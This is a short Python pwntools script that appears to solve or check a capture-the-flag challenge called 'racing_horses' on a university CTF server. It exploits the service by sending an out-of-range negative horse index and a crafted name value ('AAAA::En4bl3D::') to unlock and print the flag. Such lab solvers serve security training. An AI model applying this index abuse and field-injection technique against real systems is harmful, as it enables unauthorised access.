from pwn import *

def get_process():
    if args.REMOTE:
        return remote('racing_horses.ctf.unipi.it', 5000)
    else:
        return remote('localhost', 5000)
    
p = get_process()
p.recvuntil(b'Your horse index (max 9): ', timeout=30)
p.sendline(b'-3')
p.sendlineafter(b"Do you want to choose a custom name for the Horse? [y/N]: ",b"y")
p.sendline(b"AAAA::En4bl3D::")
p.recvuntil(b'FLAG: ', timeout=30)
flag = p.recvline().strip()
if "unipi{" in flag.decode():
    print(f"Flag found: {flag.decode()}")
    exit(0)
else:
    exit(1)
